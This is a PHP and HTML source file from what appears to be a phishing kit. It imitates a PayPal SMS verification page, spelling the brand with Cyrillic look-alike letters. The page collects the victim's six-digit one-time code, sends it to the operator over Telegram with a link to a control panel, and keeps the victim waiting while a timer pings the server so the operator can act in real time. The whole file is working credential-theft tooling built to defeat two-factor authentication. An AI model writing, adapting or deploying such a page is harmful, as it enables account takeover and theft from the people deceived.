<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['sms_code'] = $_POST['sms_code'] ?? '';
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;
    sendToTelegram("📱 <b>SMS Code</b>\nSID: <code>$sid</code>\nCode: <code>{$data['sms_code']}</code>\n\n➡️ <a href='{$panel_link}'>Open Panel</a>");
    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; font-family: "РayРalSansBig-Regular", "Helvetica Neue", Arial, sans-serif; margin: 0; padding: 0; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; padding: 20px; }
        .container { width: 100%; max-width: 440px; display: flex; flex-direction: column; align-items: center; }
        .logo { width: 80px; margin-bottom: 32px; }
        h1 { font-size: 32px; font-weight: 700; color: #000; line-height: 1.2; margin-bottom: 32px; text-align: center; }
        .code-inputs { display: flex; gap: 12px; margin-bottom: 24px; justify-content: center; width: 100%; }
        .code-inputs input { width: 100%; max-width: 56px; height: 64px; border: none; background-color: #f2f3f5; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; color: #000; outline: none; }
        .code-inputs input:focus { background-color: #e8e9eb; box-shadow: 0 0 0 2px #005ea6; }
        .checkbox-container { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 32px; cursor: pointer; user-select: none; width: 100%; }
        .checkbox-container input { display: none; }
        .custom-checkbox { width: 24px; height: 24px; border: 2px solid #000; border-radius: 4px; background-color: #fff; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .checkbox-container input:checked + .custom-checkbox { background-color: #000; border-color: #000; }
        .custom-checkbox::after { content: ""; width: 6px; height: 11px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); display: none; margin-bottom: 2px; }
        .checkbox-container input:checked + .custom-checkbox::after { display: block; }
        .checkbox-text { display: flex; flex-direction: column; gap: 4px; }
        .label-title { font-size: 16px; font-weight: 500; color: #000; } .label-desc { font-size: 14px; color: #6c7378; }
        .submit-btn { width: 100%; background-color: #005ea6; color: #fff; border: none; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s, opacity 0.2s; }
        .submit-btn:hover { background-color: #00457c; }
        @media (max-width: 480px) { body { padding: 15px; align-items: flex-start; padding-top: 40px; } .logo { width: 65px; } h1 { font-size: 26px; } .code-inputs { gap: 8px; } .code-inputs input { height: 56px; font-size: 20px; } }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <form id="smsForm" class="container" method="POST" action="sms.php?sid=<?php echo htmlspecialchars($sid); ?>">
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal">
        <h1 id="sms_title">Enter the code sent to your phone</h1>
        <div class="code-inputs">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
            <input type="text" maxlength="1" autocomplete="off" inputmode="numeric">
        </div>
        <input type="hidden" id="full-sms-code" name="sms_code" value="">
        <label class="checkbox-container">
            <input type="checkbox" name="remember_device" value="true" checked>
            <span class="custom-checkbox"></span>
            <div class="checkbox-text">
                <span class="label-title" id="sms_rem_title">Remember this device</span>
                <span class="label-desc" id="sms_rem_desc">You can update this in your settings.</span>
            </div>
        </label>
        <button class="submit-btn" type="submit" id="sms_submit">Submit</button>
    </form>
    <script>
        const inputs = document.querySelectorAll('.code-inputs input');
        const hiddenCodeInput = document.getElementById('full-sms-code');
        function updateFullCode() { let code = ''; inputs.forEach(input => code += input.value); hiddenCodeInput.value = code; }
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => { if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); updateFullCode(); });
            input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus(); });
        });
        document.getElementById('smsForm').addEventListener('submit', function(e) {
            updateFullCode();
            if (hiddenCodeInput.value.length !== 6) { e.preventDefault(); alert("Please enter the full 6-digit code."); return; }
            document.getElementById('sms_submit').innerText = "Verifying..."; document.getElementById('sms_submit').style.opacity = "0.7"; document.getElementById('sms_submit').disabled = true;
        });

        const translations_sms = {
            en: { title: "Enter the code sent to your phone", rem_t: "Remember this device", rem_d: "You can update this in your settings.", submit: "Submit" },
            de: { title: "Geben Sie den an Ihr Telefon gesendeten Code ein", rem_t: "Dieses Gerät speichern", rem_d: "Sie können dies in Ihren Einstellungen aktualisieren.", submit: "Einreichen" },
            fr: { title: "Entrez le code envoyé à votre téléphone", rem_t: "Se souvenir de cet appareil", rem_d: "Vous pouvez mettre à jour cela dans vos paramètres.", submit: "Soumettre" },
            pl: { title: "Wpisz kod wysłany na Twój telefon", rem_t: "Zapamiętaj to urządzenie", rem_d: "Możesz to zaktualizować w ustawieniach.", submit: "Wyślij" }
        };
        function initLang(lang) {
            const data = translations_sms[lang] || translations_sms['en'];
            document.getElementById('sms_title').innerText = data.title;
            document.getElementById('sms_rem_title').innerText = data.rem_t;
            document.getElementById('sms_rem_desc').innerText = data.rem_d;
            document.getElementById('sms_submit').innerText = data.submit;
        }
    </script>
    <script>const sid="<?php echo isset($sid)?addslashes($sid):'';?>"; if(sid){setInterval(()=>{fetch('process.php?action=ping&sid='+sid).catch(err=>console.error('Ping error'));},5000);}</script>
</body>
</html>